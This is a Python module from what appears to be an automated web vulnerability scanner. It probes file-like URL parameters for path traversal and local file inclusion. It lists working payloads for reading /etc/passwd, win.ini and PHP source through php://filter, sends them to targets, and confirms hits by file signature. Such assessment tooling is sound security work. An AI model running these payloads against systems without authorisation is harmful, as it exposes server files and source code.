"""Stage 5: Path traversal / local file inclusion.

File-handling parameters (`?file=`, `?download=`, `?template=`) that join user
input onto a filesystem path let an attacker read arbitrary files or include
local source. This tests only parameters that look file-ish — traversing a
`?id=` is noise — and reports only on an unambiguous file signature
(`/etc/passwd`'s `root:x:0:0:`, `win.ini`'s `[extensions]`, a PHP-filter base64
source), so a reflected payload or a soft-404 never becomes a false finding.
"""

import base64
import re
import uuid

from core.site_profile import get_profile
from modules.base import BaseModule
from tools.wrappers import curl, curl_with_status

# Parameter names worth traversing — they name a file or path.
_FILE_PARAMS = (
    "file", "path", "page", "template", "doc", "document", "download",
    "filename", "name", "include", "inc", "view", "load", "read", "dir",
    "folder", "attachment", "item", "pdf", "img", "image", "url", "src",
)

# Payloads: POSIX + Windows, raw + encoded + nested-strip, and a PHP wrapper
# that returns the target's own source base64-encoded (LFI).
_PAYLOADS = (
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../windows/win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "php://filter/convert.base64-encode/resource=index.php",
)

_PASSWD = re.compile(r"root:.*?:0:0:", re.S)
_WININI = re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I)
# "<?php" / "<!DOCTYPE" base64 prefixes. The match is only a candidate; the
# decode-and-verify below is the real gate, so the run length can be short.
_PHP_B64 = re.compile(r"\b(?:PD9waHA|PCFET0NUWVBF)[A-Za-z0-9+/=]{3,}")


def detect_file_read(body: str, payload: str) -> str:
    """Return the evidence kind if `body` proves a file read, else ''."""
    body = body or ""
    if _PASSWD.search(body):
        return "/etc/passwd (root:...:0:0:)"
    if _WININI.search(body):
        return "windows/win.ini ([extensions])"
    if "php://filter" in payload:
        for m in _PHP_B64.finditer(body):
            try:
                decoded = base64.b64decode(m.group(0)[:400] + "===").decode(
                    "utf-8", "ignore")
            except Exception:  # noqa: BLE001
                continue
            if "<?php" in decoded or "<?=" in decoded:
                return "PHP source via php://filter wrapper"
    return ""


class PathTraversal(BaseModule):
    id = "path_traversal"
    name = "Path Traversal / LFI Scan"
    stage = 5
    detectability = "medium"
    depends_on = ["parameter_discovery"]
    active = True

    async def run(self) -> str:
        base = self.base_url
        self._profile = await self._baseline(base)
        points = self._points()
        if not points:
            self.state.skip_module(self.id, "no file-like parameters")
            return "skipped"

        confirmed = 0
        for url, param in points[:20]:
            if self.should_stop(reserve=10):
                break
            if await self._probe(base, url, param):
                confirmed += 1

        self.state.complete_module(self.id)
        self.log(f"Path traversal: {confirmed} confirmed across "
                 f"{len(points)} file-like parameter(s)")
        return "done"

    def _points(self) -> list:
        from urllib.parse import urlparse, parse_qsl
        seen, points = set(), []
        for asset in self.state.get_assets_by_type("parameter"):
            attrs = asset.get("attrs", {}) or {}
            name = str(asset.get("value", "") or attrs.get("parameter", "")).lower()
            url = str(attrs.get("url", "") or "")
            if name in _FILE_PARAMS and url.startswith(("http://", "https://")):
                key = (url, name)
                if key not in seen:
                    seen.add(key)
                    points.append((url, name))
        return points

    async def _baseline(self, base: str):
        async def fetch(path: str):
            r = await curl_with_status(base.rstrip("/") + path,
                                       follow_redirects=True)
            return (r.get("status", 0), r.get("body", "") or "",
                    r.get("content_type", "") or "")
        try:
            return await get_profile(base, fetch)
        except Exception:  # noqa: BLE001
            return None

    async def _probe(self, base: str, url: str, param: str) -> bool:
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        parsed = urlparse(url)
        for payload in _PAYLOADS:
            if self.should_stop(reserve=6):
                break
            query = dict(parse_qsl(parsed.query, keep_blank_values=True))
            query[param] = payload
            probe_url = urlunparse(parsed._replace(query=urlencode(query)))
            try:
                r = await curl_with_status(probe_url, timeout=12)
            except Exception:  # noqa: BLE001
                continue
            body = r.get("body", "") or ""
            if self._profile is not None:
                try:
                    from core.response_fingerprint import fingerprint
                    if self._profile.baseline.catch_all(
                            fingerprint(r.get("status", 0), body, "")):
                        continue
                except Exception:  # noqa: BLE001
                    pass
            kind = detect_file_read(body, payload)
            if kind:
                self.state.add_finding(
                    title="Path traversal / local file inclusion",
                    severity="HIGH", confidence="CONFIRMED",
                    category="Path Traversal",
                    description=f"The '{param}' parameter reads arbitrary local "
                                f"files — the response returned {kind}.",
                    evidence=[f"{probe_url}", f"signature: {kind}"],
                    remediation="Resolve the path and confirm it stays within an "
                                "allowed base directory; reject '..' and absolute "
                                "paths; do not pass user input to file APIs.",
                    asset_keys=[f"webapp:{base}"],
                    verification={"method": "file_signature_match",
                                  "url": probe_url})
                return True
        return False
